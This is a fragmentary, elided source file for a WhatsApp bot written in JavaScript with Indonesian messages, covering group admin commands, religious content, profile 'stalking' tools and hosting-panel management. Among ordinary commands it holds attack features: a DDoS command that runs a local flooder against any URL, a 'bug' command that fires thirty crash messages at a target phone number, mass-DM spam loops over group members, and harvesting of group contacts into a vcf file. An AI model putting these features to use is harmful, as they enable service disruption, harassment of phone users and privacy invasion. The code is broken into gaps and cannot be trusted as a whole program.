let teks = `${q ? q : ''}\n‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎‎ \n`
...
yoshcss.sendMessage(m.chat, { text: teks, mentions: participants.map(a => a.id) }, { quoted: m })
}
break
//=================================================//
case 'linkgroup': case 'linkgc':{
if (!isDeveloper && !isAdmins) return yoshreply(mess.admin)
if (!m.isGroup) return yoshreply(mess.only.group)
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin Bego`)
let response = await yoshcss.groupInviteCode(m.chat)
yoshcss.sendText(m.chat, `https://chat.whatsapp.com/${response}\n\nLink Group : ${groupMetadata.subject}`, m, { detectLink: true })
}
break
//=================================================//
case 'editdesk':{
...
if (!isGroup) return yoshreply(`Khusus Group Bego`)
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin Bego`)
if (!text) return yoshreply(`teks untuk subject nya mana bego`)
await yoshcss.groupUpdateDescription(m.chat, text)
yoshreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
case 'editsubjek': {
...
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin Bego`)
if (!text) return yoshreply(`teks untuk subject nya mana bego`)
await yoshcss.groupUpdateSubject(m.chat, text)
yoshreply('Gacor Kang,Sukses,🔥')
}
break
//=================================================//
...
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin Bego`)
 if (args[0] === 'open'){
await yoshcss.groupSettingUpdate(m.chat, 'unlocked').then((res) => yoshreply(`Sukses Membuka Edit Info Group`)).catch((err) => yoshreply(jsonformat(err)))
 } else if (args[0] === 'close'){
await yoshcss.groupSettingUpdate(m.chat, 'locked').then((res) => reply(`Sukses Menutup Edit Info Group`)).catch((err) => yoshreply(jsonformat(err)))
 } else {
 yoshreply(` Silahkan Ketik\nEditinfo Open\nEditinfo Close`)
}
}
break
//=================================================//
...
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin Bego`)
if (args[0] === 'close'){
await yoshcss.groupSettingUpdate(m.chat, 'announcement').then((res) => yoshreply(`Sukses Menutup Group`)).catch((err) => yoshreply(jsonformat(err)))
} else if (args[0] === 'open'){
await yoshcss.groupSettingUpdate(m.chat, 'not_announcement').then((res) => yoshreply(`Sukses Membuka Group`)).catch((err) => yoshreply(jsonformat(err)))
} else {
 yoshreply(`Silahkan Ketik\nGroup Open\nGroup Close`)
 }
}
...
case "kick": {
if (!isGroup) return yoshreply('Only Group')
if (!isAdmins && !isDeveloper) return yoshreply('Only Admin')
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yoshcss.groupParticipantsUpdate(m.chat, [users], 'remove').then((res) => yoshreply(util.format(res))).catch((err) => yoshreply(util.format(err)))
}
break
//=================================================//
case "add": {
...
if (!isBotAdmins) return yoshreply(`Bot Bukan Admin:(`)
let users = m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yoshcss.groupParticipantsUpdate(m.chat, [users], 'add').then((res) => yoshreply(util.format(res))).catch((err) => yoshreply(util.format(err)))
}
break
//=================================================//
case "demote": {
...
if (!isGroup) return yoshreply('Only Group')
if (!isAdmins && !isDeveloper) return yoshreply('Only Admin')
if (!isBotAdmins) return yoshreply(`Bot Bukan Admi:(`)
let users = m.mentionedJid[0] ? m.mentionedJid[0] : m.quoted ? m.quoted.sender : text.replace(/[^0-9]/g, '')+'@s.whatsapp.net'
await yoshcss.groupParticipantsUpdate(m.chat, [users], 'demote').then((res) => yoshreply(util.format(res))).catch((err) => yoshreply(util.format(err)))
}
break
//=================================================//
case 'setppgroup': {
if (!isDeveloper) return yoshreply(mess.usingsetpp)
if (!isGroup) return yoshreply('Only Group')
if (!isAdmins && !isDeveloper) return yoshreply('Only Admin')
if (!isBotAdmins) return yoshreply('Maaf Kak Kaya Nya Kakak Tidak Bisa Menggunakan Fitur Ini Di Karenakan Bot Bukan Admin Group')
if (!quoted) return yoshreply(`*Where is the picture?*`)
if (!/image/.test(mime)) return yoshreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
if (/webp/.test(mime)) return yoshreply(`\`\`\`Send/Reply Image With Caption\`\`\` *${prefix + command}*`)
var mediz = await yoshcss.downloadAndSaveMediaMessage(quoted, 'ppgc.jpeg')
if (args[0] == `full`) {
...
fs.unlinkSync(mediz)
yoshreply(`*Success Beb✅*`)
} else {
var memeg = await yoshcss.updateProfilePicture(m.chat, { url: mediz })
fs.unlinkSync(mediz)
yoshreply(`*Success Beb✅*`)
}
}
...
yoshcss.sendMessage(m.chat, {text: `Fitur Anti Toxic Di Aktifkan Di Group Ini`, contextInfo: { mentionedJid : mems }}, {quoted:m})
} else if (args[0] === "off") {
...
//Islamic
case 'kisahnabi': {
if (!text) return yoshreply(`Masukan nama nabi\nExample: kisahnabi adam`)
let url = await fetch(`https://raw.githubusercontent.com/ZeroChanBot/Api-Freee/a9da6483809a1fbf164cdf1dfbfc6a17f2814577/data/kisahNabi/${text}.json`)
let kisah = await url.json().catch(_ => "Error")
if (kisah == "Error") return yoshreply("*Not Found*\n*📮 ᴛɪᴘs :* coba jangan gunakan huruf capital")
...
if (isNaN(args[0])) return yoshreply (`contoh:\nasmaulhusna 1`)
if (args[0]) {
if (args[0] < 1 || args[0] > 99) throw `minimal 1 & maksimal 99!`
let { index, latin, arabic, translation_id, translation_en } = json.find(v => v.index == args[0].replace(/[^0-9]/g, ''))
return yoshreply(`No. ${index}
${arabic}
${latin}
${translation_id}
${translation_en}
...
//=================================================//
case 'niatsholat': {
if (!q) return yoshreply(`Contoh Penggunaan :\nniatsholat Subuh`)
const niatsholat = [
{
index: 1,
solat: "subuh",
...
if (!data) return yoshreply(`${txt} Tidak Ditemukan\n\nList Solat 5 Waktu :\n• Subuh\n• Maghrib\n• Dzuhur\n• Isha\n• Ashar`)
yoshreply(`
...
await yoshcss.sendMessage(m.chat, { audio: koi, mimetype: 'audio/mp4', ptt: true }, { quoted: m })
}
break

//Cekrik
case "sshp": {
if (!text) return yoshreply(`*Example: ${prefix+command} ${global.yt}*`)
let phone = await ssweb(text, "phone")
yoshcss.sendFile(m.chat, phone.result, "", ``, m, false)
}
break
//=================================================//
case "sspc": {
...
yoshcss.sendFile(m.chat, desktop.result, "", ``, m, false)
}
break
//=================================================//
case "sstablet": {
...
yoshcss.sendFile(m.chat, tablet.result, "", ``, m, false)
}
break
...
await yoshreply(mess.wait)
let getGroups = await yoshcss.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
for (let xnxx of anu) {
let metadat72 = await yoshcss.groupMetadata(xnxx)
let participanh = await metadat72.participants
if (/image/.test(mime)) {
media = await yoshcss.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await yoshcss.sendMessage(xnxx, { image: { url: memek }, caption: text.split('|')[0]}, { quoted: m })
await sleep(text.split('|')[1])
} else {
await yoshcss.sendMessage(xnxx, { text: text.split('|')[0] }, { quoted: m })
await sleep(text.split('|')[1])
}}
yoshreply(mess.succes);
}
...
//=================================================//
case "cekidgc": {
if (!isPremium) return yoshreply('*khusus Premium*') 
yoshreply('Bentar Ya')
let getGroups = await yoshcss.groupFetchAllParticipating()
let groups = Object.entries(getGroups).slice(0).map((entry) => entry[1])
let anu = groups.map((v) => v.id)
...
for (let x of anu) {
let metadata2 = await yoshcss.groupMetadata(x)
...
const metadata2 = await yoshcss.groupMetadata(q.split("|")[0])
const colls = metadata2.participants
for (let mem of colls) {
yoshcss.sendMessage(`${mem.id.split('@')[0]}` + "@s.whatsapp.net", { text: q.split("|")[1] }, { quoted: m }
)
await sleep(1500)
}
yoshreply(mess.succes)
...
for (let pler of mem) {
yoshcss.sendMessage(pler, { text: q }, { quoted: m })
await sleep(1500)
}
yoshreply(mess.succes)
}
...
media = await yoshcss.downloadAndSaveMediaMessage(quoted)
memek = await uptotelegra(media)
await yoshcss.sendMessage(men, { image: { url: memek }, caption: captny }, { quoted: m })
await sleep(1500)
await yoshcss.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
} else {
await yoshcss.sendMessage(men, { text: captny  }, { quoted: m })
await sleep(jedany)
...
await yoshreply(mess.wait)
const groupMetadataa = !m.isGroup? await yoshcss.groupMetadata(`${text}`).catch(e => {}) : ""
...
yoshreply(util.format(err))
} finally {
await yoshcss.sendMessage(m.sender, { document: fs.readFileSync("./dtbs/contacts.vcf"), fileName: "contacts.vcf", caption: 
`🌤️Succes Om, UwU
...
await yoshreply(mess.succes)
}
break
//=================================================//
case "lookup": {
//inireact();
if (!q) return yoshreply(`Example: ${m.prefix + m.command} 62XXXX`);
try {
...
yoshreply(JSON.stringify(result, null, 2));
} catch (error) {
yoshreply(`Error: ${error.message}`);
}
}
break
...
case 'tiktokstalk':
case 'ttstalk': {
  if (!text) return yoshreply(`Username? `)
...
└────────────`
await yoshcss.sendMessage(m.chat, {image: { url: res.profile}, caption: txt}, {quoted: m })
}
break
//=================================================//
case 'igstalk': {
if (!args[0]) return yoshreply(`Enter Instagram Username\n\nExample: ${prefix + command} unucorn_xeon13`)
try {
...
└────────────`
 await yoshcss.sendMessage(m.chat, {image: { url: res.profilePic }, caption: te }, {quoted: m })
} catch {
yoshreply(`Make sure the username comes from *Instagram*`)
}
}
break
//=================================================//
case 'ffstalk':{
if (!q) return yoshreply(`Example ${prefix+command} 946716486`)
yoshreply(mess.wait)
eeh = await ffstalk.ffstalk(`${q}`)
yoshreply(`*/ Free Fire Stalker \\*
...
//=================================================//
case 'mlstalk': {
if (!q) return yoshreply(`Example ${prefix+command} 530793138|8129`)
yoshreply(mess.wait)
let dat = await mlstalk.mlstalk(q.split("|")[0], q.split("|")[1])
yoshreply(`*/ Mobile Legend Stalker \\*
...
//=================================================//
case 'npmstalk':{
if (!q) return yoshreply(`Example ${prefix+command} xeonapi`)
yoshreply(mess.wait)
eha = await npmstalk.npmstalk(q)
yoshreply(`*/ Npm Stalker \\*
...
if (!q) return yoshreply(`Example ${prefix+command} DGXeon`)
yoshreply(mess.wait)
aj = await githubstalk.githubstalk(`${q}`)
yoshcss.sendMessage(m.chat, { image: { url : aj.profile_pic }, caption: 
`*/ Github Stalker \\*
...
//Panel
case 'listram': {
yoshreply(` ╭ ──▸ ListRam ( ${global.namabot} )
 │
 │ 𖣂 Sc Private 𖤲 <特> 𖤲
 │名前 : ${m.pushName}}
...
await yoshcss.sendMessage(m.chat, { text: messageText }, { quoted: m });

if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
yoshreply(`Gunakan perintah ${prefix ? prefix : '.'}listsrv ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break;
...
if (!isDeveloper) return yoshreply(mess.owner)
let srv = args[0]
if (!srv) return yoshreply('ID nya mana?')
...
if (res.errors) return yoshreply('Server tidak ditemukan')
yoshreply('Berhasil minghapus Server.')
}
break
//=================================================//
case "listusr": {
...
if (res.meta.pagination.current_page < res.meta.pagination.total_pages) {
yoshreply(`Gunakan perintah ${prefix ? prefix : '.'}listusr ${res.meta.pagination.current_page + 1} untuk melihat halaman selanjutnya.`);
}
}
break
//=================================================//
...
if (!isDeveloper) return yoshreply(mess.owner)
let usr = args[0]
if (!usr) return yoshreply('ID nya mana?')
...
if (res.errors) return yoshreply('User tidak ditemukan')
yoshreply('Berhasil menghapus User')
}
break
//=================================================//
case "addsrv": {
if (!isDeveloper) return yoshreply(mess.owner)
let s = text.split(',');
if (s.length < 7) return yoshreply(`> *Format salah!*
...
let res = await f.json()
if (res.errors) return yoshreply(JSON.stringify(res.errors[0], null, 2))
...
case '1gb': {
if(!isReseller){
yoshreply(mess.seller)
}
if (!isDeveloper) return yoshreply(mess.owner)
let t = text.split(',');
if (t.length < 2) return yoshreply(`Format salah!\nPenggunaan:\n${prefix + command} user,nomer`)
let username = t[0];
...
if (!u) return
let d = (await yoshcss.onWhatsApp(u.split`@`[0]))[0] || {}
...
if (data.errors) return yoshreply(JSON.stringify(data.errors[0], null, 2));
...
yoshreply(`User ID: ${user.id}`)
let ctf = `❗Hai @${m.sender.split('@')[0]} , Owner Baru Saja Memberikan Anda Akses Ke Akun Panel Berikut >

👤 Username: ${user.username}
🔐 Password: ${password}
🔗 Url: ${domain}`
yoshcss.sendMessage(u, { image: { url: 'https://telegra.ph/file/5f0a82c456e867a17b5f4.jpg' }, caption: ctf }, { quoted: m })
...
if (res.errors) return yoshreply(JSON.stringify(res.errors[0], null, 2))
let server = res.attributes
let p = await yoshreply(`Sukses menambahkan User dan Server
...
yoshreply(`Mohon tunggu sebentar, sedang dalam proses 🕧. Serangan DDoS telah dieksekusi ke Situs Web yang dituju: ${url} 👤 Proses ini diperkirakan akan berlangsung selama ${time} detik. Terima kasih atas kesabaran Anda.`);
exec(`node ./ddos/mix.js ${url} ${time} ${thread} ${rate}`, (err, stdout) => {
if (err) return console.log(err.toString())
if (stdout) return console.log(util.format(stdout))
})
} else {
yoshreply(`Format pesan tidak benar. Gunakan format: .${command} [url] [time] [thread] [rate]`)
}
}
break
//=================================================//
...
//=================================================//
case "check-host": {
if (!q) return yoshreply (`Example : ${m.prefix + m.command} https://nxnn.com`)
...
if (!isPremium) return yoshreply(mess.premium)
if (!q) return yoshreply(`Penggunaan .${command} 6287392784527`)
let bijipler = q.replace(/[^0-9]/g, "")
if (bijipler.startsWith('0')) return yoshreply(`<!> Nomor dimulai dengan angka 0. Gantilah dengan nomor yang berawalan kode negara\n\n<✓> Example : .${command} 6287392784527`)
let target = bijipler + '@s.whatsapp.net'
await yoshreply(mess.bugrespon)
for (let j = 0; j < 30; j++) {
...
await yoshreply(`<✓> Successfully Send Bug to ${bijipler} Using ${command}. ✅\n\n<!> Pause 5 minutes so that the bot is not banned.`)
}
break
//=================================================//
...
break
//=================================================//
case '🤣': case '1hit': case 'mimir': case '1shoot': {
